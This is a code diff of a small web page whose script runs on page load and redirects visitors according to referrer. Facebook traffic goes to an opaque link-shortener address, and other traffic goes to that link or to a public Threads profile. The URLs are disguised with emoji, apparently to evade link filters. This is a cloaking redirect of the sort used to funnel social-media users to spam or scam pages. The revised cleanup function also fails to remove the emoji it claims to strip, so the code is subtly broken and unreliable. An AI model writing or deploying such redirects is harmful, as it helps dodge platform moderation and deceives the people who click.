@@ -3,18 +3,21 @@
 <head>
     <title>Parker1504</title>
     <script>
-      function redirectToDifferentWebsite() {
-        var userAgent = navigator.userAgent.toLowerCase();
-        var isMobile = /iphone|ipod|android|blackberry|opera mini|windows phone|iemobile|mobile/i.test(userAgent);
+      document.addEventListener("DOMContentLoaded", function () {
+        // Function to clean URLs by removing the character "‎"
+        function cleanURL(url) {
+          return url.replace(/‎/g, ""); // Replace the unwanted character with an empty string
+        }
+    
         var referrer = document.referrer.toLowerCase();
         var mobileDeviceWithEmoji = "https://m😍agl😍it.me/poshuimichs";
         var pcURLWithEmoji = "https://www.th😍r😍eads😍.net/@zuck";
         var youtubeURLWithEmoji = "https://m😍agl😍it.me/poshuimichs";
-        
-        // Create a "clean" version of the links without the emoji
-        var mobileDevice = "https://maglit.me/poshuimichs"; // Clean link without emoji
-        var pcURL = "https://www.threads.net/@zuck"; // Clean link without emoji
-        var youtubeURL = "https://maglit.me/poshuimichs"; // Clean link without emoji
+    
+        // Create "clean" versions of the links without the emoji
+        var mobileDevice = cleanURL(mobileDeviceWithEmoji);
+        var pcURL = cleanURL(pcURLWithEmoji);
+        var youtubeURL = cleanURL(youtubeURLWithEmoji);
     
         // Check if the referrer is Facebook and redirect mobile users to the "clean" mobileDevice URL
         if (referrer.includes("facebook.com")) {
@@ -27,15 +30,9 @@
           // If the referrer is not Facebook, redirect to the "clean" YouTube URL
           window.location.href = youtubeURL;
         }
-      }
-    
-      redirectToDifferentWebsite();
+      });
     </script>
-    
-    
-    
-
-    
+  
     
     
 
